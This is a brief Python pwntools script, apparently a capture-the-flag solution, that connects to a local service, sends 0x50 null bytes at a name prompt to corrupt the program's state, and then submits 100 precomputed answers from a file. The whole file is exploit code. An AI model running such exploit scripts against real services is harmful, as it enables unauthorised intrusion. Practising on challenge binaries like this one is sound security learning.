from pwn import *

r = remote('127.0.0.1', 4765)

r.recvuntil("Who goes there?\n")
r.send("\x00"*0x50 + "\n")

nums = open('ans.txt', 'r').readlines()
for i in range(100):
    print(r.recvuntil("it?\n"))
    r.send(nums[i])

print(r.recv())
